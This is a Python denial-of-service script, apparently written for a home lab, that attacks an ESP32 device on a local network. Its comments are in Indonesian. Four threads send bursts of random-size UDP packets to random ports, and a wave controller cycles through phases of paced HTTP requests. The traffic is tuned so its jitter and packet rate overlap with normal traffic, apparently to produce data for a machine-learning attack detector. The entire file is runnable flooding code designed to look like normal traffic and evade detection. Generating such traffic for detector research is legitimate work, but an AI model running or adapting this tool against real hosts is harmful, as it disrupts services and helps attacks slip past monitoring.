"""
DoS Attacker v7.1 — PRECISION JITTER & LOW PPS TUNER
====================================================
Target ML: 
- JITTER     : Dipaksa berfluktuasi hebat (50 - 300ms) via Micro-Burst.
- Packet Rate: Ditahan ketat di bawah 6 pps agar overlap dengan Normal.
- Interval   : 800 - 2500ms
- Latency    : 40 - 400ms

STRATEGI (Berdasarkan Base v7.0):
1. UDP MICRO-BURSTING: UDP tidak lagi dikirim konstan. Kadang 1 paket, 
   kadang 20 paket sekaligus dengan ukuran acak (32b - 2048b). 
   Ketidakteraturan ekstrim inilah yang MURNI melahirkan JITTER.
2. HTTP DELAY CAP: Delay HTTP ditahan di angka 0.35s ke atas, menjamin 
   request rate (PPS) ESP32 tetap rendah dan model ML tidak bisa curang.
"""

import requests
import time
import threading
import socket
import random
import sys
import os

# ─── CONFIG ──────────────────────────────────────────────
IP_ESP32   = "192.168.1.6"  # ⚠️ GANTI DENGAN IP LOKAL ESP32 ANDA
PORT_ESP32 = 80
PING_URL   = f"http://{IP_ESP32}/ping"

# ─── THREADS ─────────────────────────────────────────────
UDP_THREADS  = 4   # Penghancur Jitter & Latency (Airtime)
HTTP_THREADS = 2   # Pengendali Interval & PPS

stop_event = threading.Event()
wave_lock  = threading.Lock()

# ─── WAVE CONTROLLER ─────────────────────────────────────
current_wave = {}

WAVES = [
    # HEAVY: 
    # - HTTP: 2 thread x (1 / 0.35s) = ~5.7 req/s (Maksimal PPS, ditambah noise = ~6-8 pps)
    # - UDP : Delay sangat kecil, memicu burst Jitter yang gila-gilaan.
    {"phase": "HEAVY",  "udp_delay": 0.005, "http_delay": 0.35, "dur": 25},  
    
    # MEDIUM:
    # - HTTP: 2 thread x (1 / 0.70s) = ~2.8 req/s (Overlap tebal dengan Normal)
    {"phase": "MEDIUM", "udp_delay": 0.015, "http_delay": 0.70, "dur": 10}, 
    
    # LIGHT (ZONA OVERLAP ML):
    # - HTTP: 2 thread x (1 / 1.50s) = ~1.3 req/s (Murni mirip Normal)
    {"phase": "LIGHT",  "udp_delay": 0.040, "http_delay": 1.50, "dur": 10},  
]

# =========================================================
#  THREAD 1: UDP MICRO-BURST FLOOD (TARGET: JITTER MAKSIMAL)
# =========================================================
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_event.is_set():
        with wave_lock:
            delay = current_wave.get("udp_delay", 0.1)
            
        # ⚠️ KUNCI JITTER: MICRO-BURSTING 
        # Kadang tembak 1 paket, kadang 20 paket secara instan.
        # Router dan ESP32 benci lalu lintas yang tidak bisa ditebak (Burst).
        burst_size = random.randint(1, 20)
        
        for _ in range(burst_size):
            # Ukuran paket ekstrim bervariasi untuk mengacaukan parsing ESP32
            payload_size = random.choice([32, 128, 512, 1024, 2048])
            payload = os.urandom(payload_size)
            
            try:
                sock.sendto(payload, (IP_ESP32, random.randint(10000, 65000)))
            except:
                pass
                
        # Jeda tidur dengan deviasi sangat tinggi (0.5x sampai 2.5x)
        # Menambah elemen "kaget" pada jaringan.
        time.sleep(delay * random.uniform(0.5, 2.5))

# =========================================================
#  THREAD 2: HTTP CPU LOADER (TARGET: INTERVAL & LOW PPS)
# =========================================================
def http_loader():
    session = requests.Session()
    
    while not stop_event.is_set():
        with wave_lock:
            delay = current_wave.get("http_delay", 0.5)
            
        try:
            # Tetap meminta ESP32 bekerja, tapi frekuensinya diatur ketat
            session.get(PING_URL, timeout=1.0, headers={"Connection": "close"})
        except:
            pass
            
        time.sleep(delay * random.uniform(0.9, 1.1))

# =========================================================
#  WAVE CONTROLLER
# =========================================================
def wave_controller():
    global current_wave
    idx = 0
    while not stop_event.is_set():
        wave = WAVES[idx]
        with wave_lock:
            current_wave = wave
            
        print(f"\n[WAVE] Fase: {wave['phase']} | UDP(Jit): {wave['udp_delay']}s | HTTP(PPS): {wave['http_delay']}s")
        time.sleep(wave["dur"])
        idx = (idx + 1) % len(WAVES)

# =========================================================
#  MAIN
# =========================================================
if __name__ == "__main__":
    if "192.168.1.XX" in IP_ESP32:
        print("❌ ERROR: Isi IP ESP32 terlebih dahulu!")
        sys.exit(1)

    print("="*65)
    print(" DoS Attacker v7.1 — PRECISION JITTER & LOW PPS")
    print(" Solusi: Micro-Bursting UDP untuk Jitter ekstrim & Hold PPS")
    print("="*65)
    print(f" Target Interval : 800 - 2500 ms")
    print(f" Target Latency  : 40 - 400 ms")
    print(f" Target Jitter   : 50 - 300 ms (Bergetar Hebat)")
    print(f" Target PPS      : < 8.0 pps   (Tumpang Tindih Kuat)")
    print("="*65)
    
    input("Tekan ENTER untuk memulai serangan v7.1...\n")
    
    threads = []
    threads.append(threading.Thread(target=wave_controller, daemon=True))
    
    for _ in range(UDP_THREADS):
        threads.append(threading.Thread(target=udp_flood, daemon=True))
    for _ in range(HTTP_THREADS):
        threads.append(threading.Thread(target=http_loader, daemon=True))
        
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[STOP] Menghentikan serangan...")
        stop_event.set()
